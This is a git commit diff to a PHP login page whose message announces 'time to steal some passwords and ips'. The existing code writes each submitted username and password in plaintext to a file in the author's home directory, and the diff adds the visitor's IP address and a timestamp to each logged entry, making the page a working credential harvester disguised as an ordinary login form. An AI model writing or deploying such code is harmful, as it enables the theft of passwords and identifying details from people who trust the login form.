d4ce80c07645974aa9f66e735ec39fbc9c619362
albert926 <103927053+albert926@users.noreply.github.com>
2025-07-15 11:41:57 +0800

    lol, time to steal some passwords and ips lol, read terms first before doing this type of login xD

--- login.php
+++ login.php
@@ -3,23 +3,26 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $username = htmlspecialchars($_POST['username']);
     $password = htmlspecialchars($_POST['pswrd']);
 
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $timestamp = date("Y-m-d H:i:s");
+
     $filePath = "/home/albert/logins.txt";
 
     if ($file = fopen($filePath, "a")) {
-        fwrite($file, "Username: $username, Password: $password\n");
+        fwrite($file, "[$timestamp][$ip] Username: $username, Password: $password\n");
         fclose($file);
     }
     ?>
     <!DOCTYPE html>
     <html lang="en">
     <head>
-      <meta charset="UTF-8" />
-      <title>Welcome!</title>
-      <link rel="stylesheet" href="namer.css" />
-      <script src="login.js" defer></script>
+        <meta charset="UTF-8" />
+        <title>Welcome!</title>
+        <link rel="stylesheet" href="namer.css" />
+        <script src="login.js" defer></script>
     </head>
     <body>
-      <h1>Welcome, <?php echo $username; ?>! 🎉</h1>
+        <h1>Welcome, <?php echo $username; ?>! 🎉</h1>
     </body>
     </html>
     <?php
